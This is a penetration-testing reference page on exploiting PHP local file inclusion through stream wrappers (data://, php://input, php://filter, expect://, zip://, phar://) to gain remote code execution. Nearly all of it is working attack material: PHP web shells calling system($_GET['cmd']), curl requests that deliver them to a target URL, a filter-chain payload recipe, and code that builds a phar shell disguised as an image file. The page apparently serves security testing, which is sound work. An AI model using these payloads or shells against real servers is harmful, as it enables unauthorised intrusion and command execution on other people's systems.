---
authors: LucasParsy, ShutdownRepo
category: web
---

# PHP wrappers and streams

::: details data://
The attribute `allow_url_include` must be set. This configuration can be checked in the `php.ini` file.


```bash
# Shell in base64 encoding
echo "<?php system($_GET['cmd']); ?>" | base64

# Accessing the log file via LFI
curl --user-agent "PENTEST" "$URL/?parameter=data://text/plain;base64,$SHELL_BASE64&cmd=id"
```

:::


::: details php://input
The attribute `allow_url_include` should be set. This configuration can be checked in the `php.ini` file.


```bash
# Testers should make sure to change the $URL
curl --user-agent "PENTEST" -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
```

:::


::: details php://filter
The `filter` wrapper doesn't require the `allow_url_include` to be set. This works on default PHP configuration `allow_url_include=off`.


```bash
# Testers should make sure to change the $URL, $FILTERS with the chaining that generates their payload and $FILE with the path to the file they can read.
curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE"
```


The [php_filter_chain_generator.py](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py) script (Python3) implements the generation of the PHP filters chaining.


```
# Example: generate <?=`$_GET[cmd]`;;?> (base64 value: PD89YCRfR0VUW2NtZF1gOzs/Pg) using /etc/passwd file to run whoami command on the target.

# Generate the payload 
python3 php_filter_chain_generator.py --chain '<?=`$_GET[cmd]`;;?>'

# Fill variables
FILTERS="convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|[...]|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode"
FILE="/etc/passwd"

# Get RCE on the target
curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE&cmd=whoami"
```


Finding a valid path to a file on the target is not required. PHP wrappers like `php://temp` can be used instead.

The research article "[PHP filters chain: What is it and how to use it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)" from Synacktiv, and [the original writeup](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d), go into the details of that technique.
:::


::: details expect://
The `expect` wrapper doesn't required the `allow_url_include` configuration, the `expect` extension is required instead.

```bash
curl --user-agent "PENTEST" -s "$URL/?parameter=expect://id"
```
:::


::: details zip://
The prerequisite for this method is to be able to [upload a file](../../unrestricted-file-upload.md).


```bash
echo "<?php system($_GET['cmd']); ?>" > payload.php
zip payload.zip payload.php

# Accessing the log file via LFI (the # identifier is URL-encoded)
curl --user-agent "PENTEST" "$URL/?parameter=zip://payload.zip%23payload.php&cmd=id"
```

:::


::: details phar://
The prerequisite for this method is to be able to [upload a file](../../unrestricted-file-upload.md).

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

The tester need to compile this script into a `.phar` file that when called would write a shell called `shell.txt` .

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now the tester has a `phar` file named `shell.jpg` and he can trigger it through the `phar://` wrapper.


```bash
curl --user-agent "PENTEST" "$URL/?parameter=phar://./shell.jpg%2Fshell.txt&cmd=id"
```

:::